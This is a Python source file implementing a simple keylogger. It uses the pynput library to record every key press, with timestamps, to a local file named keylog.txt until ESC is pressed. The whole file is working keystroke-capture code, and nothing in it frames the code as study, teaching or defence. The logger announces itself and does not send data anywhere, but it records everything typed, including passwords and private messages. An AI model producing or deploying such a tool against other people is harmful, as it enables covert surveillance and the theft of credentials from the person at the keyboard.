# keylogger.py

from pynput import keyboard
import logging
import os

# Set up logging configuration
log_file_path = os.path.join(os.getcwd(), "keylog.txt")
logging.basicConfig(
    filename=log_file_path,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Function to log key presses
def on_press(key):
    try:
        logging.info('Key pressed: {}'.format(key.char))
    except AttributeError:
        logging.info('Special key pressed: {}'.format(key))

# Function to stop the keylogger
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start the keylogger
if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()